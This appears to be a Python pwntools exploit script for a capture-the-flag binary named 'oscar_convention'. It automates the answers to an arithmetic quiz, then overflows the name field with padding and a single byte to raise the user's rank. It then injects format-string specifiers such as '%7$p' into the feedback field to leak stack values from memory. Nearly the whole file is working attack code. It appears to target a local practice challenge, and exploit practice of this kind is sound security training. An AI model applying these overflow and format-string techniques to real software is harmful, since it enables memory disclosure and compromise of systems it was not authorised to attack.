from pwn import *
import re
context.log_level='error'
def start(): return process(['/home/bocil/ctf/nfx/work/event/pwn/nfxctf-convention/src/peserta/ld-linux-x86-64.so.2','--library-path','/home/bocil/ctf/nfx/work/event/pwn/nfxctf-convention/src/peserta','/home/bocil/ctf/nfx/work/event/pwn/nfxctf-convention/src/peserta/oscar_convention'])
def rank5(p):
    p.sendline(b'x'); p.recvuntil(b'Choice: '); p.sendline(b'2')
    for _ in range(10):
        d=p.recvuntil(b'Answer: '); a,b=map(int,re.findall(rb'(\d+) \+ (\d+) = \?',d)[-1]); p.sendline(str(a+b).encode())
    p.recvuntil(b'Choice: '); p.sendline(b'3'); p.recvuntil(b'Enter new name: '); p.sendline(b'A'*64+b'B'*4+b'\x14'); p.recvuntil(b'Choice: ')
for i in [7,15,17]:
    p=start(); rank5(p); p.sendline(b'4'); p.recvuntil(b'Enter your feedback: '); p.sendline(('%'+str(i)+'$p').encode()); p.recvuntil(b'Choice: '); p.sendline(b'1'); out=p.recvuntil(b'--------------------',timeout=3)
    print('%%%d$p = %s'%(i,re.search(rb'Activity Log: (.*)\n',out,re.S).group(1).decode()))
    p.close()
